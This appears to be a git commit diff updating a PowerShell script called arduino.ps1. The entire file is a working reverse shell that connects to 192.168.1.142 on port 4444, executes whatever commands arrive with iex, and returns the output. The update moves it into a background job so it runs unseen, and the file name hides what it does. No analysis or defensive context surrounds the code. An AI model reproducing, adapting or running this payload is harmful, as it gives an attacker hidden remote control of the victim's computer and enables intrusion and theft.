fe66a332f162f06d4f88f4dd338ffad5086c0ac1
Le_Floppa <122199312+LFL38@users.noreply.github.com>
2024-02-29 01:02:50 +0200

    Update arduino.ps1

--- arduino.ps1
+++ arduino.ps1
@@ -1,1 +1,12 @@
-$sm=(New-Object Net.Sockets.TCPClient('192.168.1.142',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
+$scriptBlock = {
+    $sm = (New-Object Net.Sockets.TCPClient('192.168.1.142', 4444)).GetStream()
+    [byte[]]$bt = 0..65535 | ForEach-Object { 0 }
+
+    while (($i = $sm.Read($bt, 0, $bt.Length)) -ne 0) {
+        $d = (New-Object Text.ASCIIEncoding).GetString($bt, 0, $i)
+        $st = ([Text.Encoding]::ASCII).GetBytes((iex $d 2>&1))
+        $sm.Write($st, 0, $st.Length)
+    }
+}
+
+Start-Job -ScriptBlock $scriptBlock
